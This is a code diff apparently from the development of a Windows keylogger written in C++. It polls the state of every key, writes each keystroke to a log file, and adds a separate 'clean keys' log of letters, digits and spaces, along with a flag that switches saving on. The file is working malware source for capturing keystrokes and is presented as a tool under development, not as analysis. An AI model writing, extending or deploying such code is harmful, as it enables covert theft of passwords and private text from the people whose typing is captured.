@@ -16,9 +16,6 @@
 
 std::string Keylogger::intToString(int i)
 {
-	//#ifdef DEBUG
-	printf("Converting: %d to string.\n", i);
-	//#endif
 	char buffer[4];
 	_itoa_s(i, buffer, 4, 10);
 	return std::string(buffer);
@@ -63,20 +60,21 @@ std::string Keylogger::dirBasename(std::string path)
 	return path;
 }
 
+void Keylogger::save_to_file(std::ofstream &file_stream, const std::string &content)
+{
+	if (saving_enabled)
+	{
+		file_stream << content;
+		file_stream.flush();
+	}
+}
+
 
 void Keylogger::get_key(std::ofstream &file_logs)
-{
-	// logging keys, thats the keylogger
-
+{	
 	for (unsigned char c = 1; c < 255; c++)
 	{
-#ifdef DEBUG_TO_LOGS
-		//printf("Calling GetAsyncKeyState()", filepath);
-#endif // DEBUG
 		SHORT return_value = GetAsyncKeyState(c);
-#ifdef DEBUG_TO_LOGS
-		//printf("GetAsyncKeyState() returned: %d", return_value);
-#endif // DEBUG
 		if (return_value & 1)
 		{ // on press button down
 			std::string key = "";
@@ -131,7 +129,10 @@ void Keylogger::get_key(std::ofstream &file_logs)
 			else if ((c >= 65 && c <= 90)
 				|| (c >= 48 && c <= 57)
 				|| c == 32) // letters and numbers
+			{
 				key = c;
+				save_to_file(file_logs_clean_keys, key);
+			}
 
 			else if (c == 91 || c == 92)
 				key = "[WIN]";
@@ -182,8 +183,7 @@ void Keylogger::get_key(std::ofstream &file_logs)
 #ifdef DEBUG
 			printf("Key = %s (%d)\n", key.c_str(), c);
 #endif
-			file_logs << key;
-			file_logs.flush();
+			save_to_file(file_logs, key);
 		}
 	}
 }
@@ -204,17 +204,39 @@ std::string Keylogger::create_file()
 	printf("Saving content to: filepath '%s'\n", file_path);
 #endif // DEBUG
 
-	return std::string(file_path);
+	m_file_path = std::string(file_path);
+	
+	size_t position_to_prepend = m_file_path.find(".log");
+	std::string path_for_clean_keys = m_file_path;
+	path_for_clean_keys.insert(position_to_prepend, "_clean_key");
+	this->file_logs_clean_keys.open(path_for_clean_keys);
+
+
+	return m_file_path;
 }
 
+Keylogger::Keylogger() { }
+
+Keylogger::Keylogger(bool save_enabled) 
+{
+	saving_enabled = save_enabled;
+}
+
+std::ofstream& Keylogger::get_file_logs_clean_keys()
+{
+	return file_logs_clean_keys;
+}
 
 int main(int argc, char *argv[])
 {
-	Keylogger keylogger;
+	bool saving_enabled = true;
+
+	Keylogger keylogger(saving_enabled);
 	std::string file_path = keylogger.create_file();
 	std::ofstream file_logs(file_path);
 
-	Application_History application_history(file_logs, file_path);
+	Application_History application_history(file_logs, keylogger.get_file_logs_clean_keys(), 
+		file_path, saving_enabled);
 
 	while (1)
 	{
